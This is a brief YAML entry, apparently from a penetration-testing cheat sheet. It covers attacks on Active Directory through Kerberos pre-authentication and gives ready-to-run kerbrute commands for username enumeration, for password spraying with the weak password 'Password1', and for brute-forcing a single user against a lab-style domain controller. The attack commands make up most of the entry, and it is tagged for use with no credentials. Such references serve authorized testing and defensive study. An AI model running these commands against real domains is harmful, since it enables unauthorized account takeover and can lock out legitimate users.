---
description: |
  Enumerate valid AD usernames and perform password spraying
  via Kerberos pre-authentication.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
command: |
  # Username enumeration
  kerbrute userenum --dc 10.10.10.1 -d test.local users.txt

  # Password spraying
  kerbrute passwordspray --dc 10.10.10.1 -d test.local users.txt 'Password1'

  # Brute force single user
  kerbrute bruteuser --dc 10.10.10.1 -d test.local passwords.txt john
phase:
  - Enumeration
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
items:
  - No_Creds
  - Username
techniques:
  - Password_Spraying
network_position:
  - Internal
references:
  - https://github.com/ropnop/kerbrute
---
